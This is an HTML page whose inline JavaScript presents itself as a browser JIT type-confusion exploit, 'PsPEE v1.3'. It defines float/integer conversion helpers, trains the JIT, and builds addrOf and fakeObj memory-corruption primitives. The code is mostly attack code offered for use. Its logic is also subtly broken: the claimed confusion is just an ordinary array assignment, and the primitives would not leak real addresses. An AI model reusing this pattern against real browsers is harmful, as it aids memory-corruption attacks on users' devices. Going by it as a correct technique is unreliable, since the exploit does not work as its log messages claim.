<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #000;
            color: #0f0;
            padding: 10px;
            width: 100%;
            height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        const log = msg => output.textContent += msg + "\n";

        const f64 = new Float64Array(1);
        const u32 = new Uint32Array(f64.buffer);
        function f2i(f) {
            f64[0] = f;
            return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
        }
        function i2f(i) {
            u32[0] = Number(i & 0xFFFFFFFFn);
            u32[1] = Number(i >> 32n);
            return f64[0];
        }

        log("[*] PsPEE v1.3 - exploiting type confusion...");

        let float_arr = [1.1, 2.2, 3.3];
        let obj_arr = [{}, {}, {}];

        function confuse(o) {
            let tmp = [1.1, 2.2, 3.3];
            tmp[1] = o;
            return tmp[1];
        }

        // Train JIT
        for (let i = 0; i < 10000; i++) confuse(2.2);

        // Set up overlap
        let corrupted = confuse(obj_arr);

        if (typeof corrupted === "object") {
            log("[+] Type confusion achieved!");

            // Step 1: Make the float array reference the object array's backing store
            float_arr[0] = obj_arr;

            // Step 2: addrOf primitive
            function addrOf(obj) {
                obj_arr[0] = obj;
                return f2i(float_arr[0]);
            }

            // Step 3: fakeObj primitive
            function fakeObj(addr) {
                float_arr[0] = i2f(addr);
                return obj_arr[0];
            }

            // Test primitives
            let test_obj = {a: 1337};
            let addr = addrOf(test_obj);
            log("[+] addrOf({a:1337}): " + addr.toString(16));

            let fake = fakeObj(addr);
            log("[+] fakeObj(addr): " + JSON.stringify(fake));
        } else {
            log("[-] Type confusion failed.");
        }
    </script>
</body>
</html>
